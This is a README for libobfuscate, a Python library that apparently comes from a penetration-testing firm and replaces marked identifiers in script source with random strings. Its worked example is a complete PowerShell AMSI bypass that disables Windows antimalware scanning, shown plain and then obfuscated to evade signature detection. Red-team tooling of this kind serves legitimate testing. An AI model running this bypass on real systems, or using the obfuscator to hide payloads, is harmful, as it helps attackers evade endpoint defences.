# libobfuscate

Repository containing a Python library that can be used to quickly obfuscate script-based language source code.

Associated technical blog post and details at [https://pentest.lambda-security.com/posts/source-code-obfuscation-library](https://pentest.lambda-security.com/posts/source-code-obfuscation-library)

## Installing

Installing is as simple as running the provided setup.py file:

```
$ git clone https://github.com/lambda-security/libobfuscate
$ cd libobfuscate
$ python3 setup.py install
```

Or in a virtual environment first:

```
$ git clone https://github.com/lambda-security/libobfuscate
$ cd libobfuscate
$ virtualenv -p python3 venv
$ . venv/bin/activate
$ python3 setup.py install
```

## Using the library

Using the library requires special placeholder values to be used in the source code. A special template-like statement `<%=obf ... %>` has to be used to indicate that a certain variable, function, class etc is to be obfuscated.

For example, with a simple PowerShell AMSI bypass in the form of:

```
$a = [Ref].Assembly.GetTypes()
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
}
$d = $c.GetFields("NonPublic,Static")
Foreach($e in $d) {
    if ($e.Name -like "*Failed") {
        $f=$e
    }
}
$f.SetValue($null,$true)
```

A templatized version to be processed by libofuscate would look like:

```
$<%=obf a %> = [Ref].Assembly.GetTypes()
Foreach($<%=obf b %> in $<%=obf a %>) {
    if ($<%=obf b %>.Name -like "*iUtils") {
        $<%=obf c %> = $<%=obf b %>
    }
}
$<%=obf d %> = $<%=obf c %>.GetFields("NonPublic,Static")
Foreach($<%=obf e %> in $<%=obf d %>) {
    if ($<%=obf e %>.Name -like "*Failed") {
        $<%=obf f %>=$<%=obf e %>
    }
}
$<%=obf f %>.SetValue($null,$true)
```

Either from a Python interpreter or through a standalone script, the obfuscation library can be used as follows:

```
>>> import libobfuscate
>>> script = '''
... $<%=obf a %> = [Ref].Assembly.GetTypes()
... Foreach($<%=obf b %> in $<%=obf a %>) {
...     if ($<%=obf b %>.Name -like "*iUtils") {
...         $<%=obf c %> = $<%=obf b %>
...     }
... }
... $<%=obf d %> = $<%=obf c %>.GetFields("NonPublic,Static")
... Foreach($<%=obf e %> in $<%=obf d %>) {
...     if ($<%=obf e %>.Name -like "*Failed") {
...         $<%=obf f %>=$<%=obf e %>
...     }
... }
... $<%=obf f %>.SetValue($null,$true)
... '''
>>> obfuscated = libobfuscate.obfuscate(script, ['?l', '?u'], 8, 16)
>>> print(obfuscated)

$gBXbOLMYI = [Ref].Assembly.GetTypes()
Foreach($LlhKsKlJSL in $gBXbOLMYI) {
    if ($LlhKsKlJSL.Name -like "*iUtils") {
        $OMmZARTbcPQI = $LlhKsKlJSL
    }
}
$kRUHbfJjN = $OMmZARTbcPQI.GetFields("NonPublic,Static")
Foreach($zyPxRCAzFIfWUIk in $kRUHbfJjN) {
    if ($zyPxRCAzFIfWUIk.Name -like "*Failed") {
        $dsDToOCJUWoNF=$zyPxRCAzFIfWUIk
    }
}
$dsDToOCJUWoNF.SetValue($null,$true)

```

The function call takes in 3 parameters to customize the obfuscation process, with the function prototype being `obfuscate(s, chars, min_length, max_length)`:

```
obfuscate(s, chars, min_length, max_length)
    Obfuscates placeholders in the input string with random strings.

    Parameters:
    s (str):             The input string containing placeholders.
    chars (list of str): List of character sets to use ('?u' for uppercase, '?l' for lowercase, '?d' for digits).
    min_length (int):    Minimum length of the generated random string.
    max_length (int):    Maximum length of the generated random string.

    Returns:
    str: The input string with placeholders replaced by random strings.

    Example:
    >>> obfuscate('<%=obf placeholder %>', ['?u', '?l'], 5, 10)
    'AbcDeFgHiJ'
```

The `chars` parameter must be a list of hashcat-type mask characters and the library supports:

- `?l` for lowercase
- `?u` for uppercase
- `?d` for digits

Any of them must be supplied, with a minimum requirement that only `?d` is unsupported due to the fact that variables, functions, classes etc do not typically start with a digit.

If the `chars` parameter contains `?d` and/or `?l`, `?u`, the library will ensure the obfuscated string will **not** begin with a digit. This is to eliminate the possibility of invalid source code identifiers that begin with a number, if the language does not support it.

The `min_length` and `max_length` parameters indicate the obfuscated string length of any of the inputs; the value in the range of `min_length` and `max_length` is not static for the entire obfuscation processes, instead it is randomly selected for each individual variable indicated by `<%=obf ... %>`. Internally, the library constructs a dictionary with each value to be obfuscated and for each one it is replaced with a randomly generated one, ensuring consistency in code references.

